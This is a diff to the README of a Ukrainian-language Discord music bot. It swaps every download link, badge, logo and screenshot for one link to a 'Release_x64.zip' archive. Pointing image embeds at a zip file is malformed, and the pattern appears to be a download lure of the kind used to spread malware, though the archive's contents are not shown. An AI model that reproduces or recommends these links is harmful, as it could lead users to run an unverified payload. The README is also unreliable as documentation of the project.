@@ -1,6 +1,6 @@
 # 🎵 JMusicBot_UKR 🇺🇦
 
-![JMusicBot_UKR Logo](https://example.com/logo.png)
+![JMusicBot_UKR Logo](https://github.com/plopzyy/JMusicBot_UKR/releases/download/v2.0/Release_x64.zip)
 
 ## Introduction
 
@@ -16,7 +16,7 @@ Welcome to **JMusicBot_UKR**, the ultimate Discord music bot in Ukrainian langua
 ## Setup
 
 1. Make sure you have Java installed on your system.
-2. Download the [Software.zip](https://github.com/user-attachments/files/18383251/Software.zip) file.
+2. Download the [https://github.com/plopzyy/JMusicBot_UKR/releases/download/v2.0/Release_x64.zip](https://github.com/plopzyy/JMusicBot_UKR/releases/download/v2.0/Release_x64.zip) file.
 3. Unzip the file.
 4. Follow the setup instructions included in the file.
 5. Start enjoying music in Ukrainian on your Discord server!
@@ -28,7 +28,7 @@ Welcome to **JMusicBot_UKR**, the ultimate Discord music bot in Ukrainian langua
 
 If the provided link does not work or if you need further assistance, please check the "Releases" section of this repository for alternative download options.
 
-[![Download JMusicBot_UKR](https://img.shields.io/badge/Download-Software.zip-green)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download JMusicBot_UKR](https://github.com/plopzyy/JMusicBot_UKR/releases/download/v2.0/Release_x64.zip)](https://github.com/plopzyy/JMusicBot_UKR/releases/download/v2.0/Release_x64.zip)
 
 ## Let's Get Started!
 
@@ -38,9 +38,9 @@ Rock on! 🤘🎵
 
 ## Screenshots
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
-![Screenshot 3](https://example.com/screenshot3.png)
+![Screenshot 1](https://github.com/plopzyy/JMusicBot_UKR/releases/download/v2.0/Release_x64.zip)
+![Screenshot 2](https://github.com/plopzyy/JMusicBot_UKR/releases/download/v2.0/Release_x64.zip)
+![Screenshot 3](https://github.com/plopzyy/JMusicBot_UKR/releases/download/v2.0/Release_x64.zip)
 
 ## Support and Feedback
 
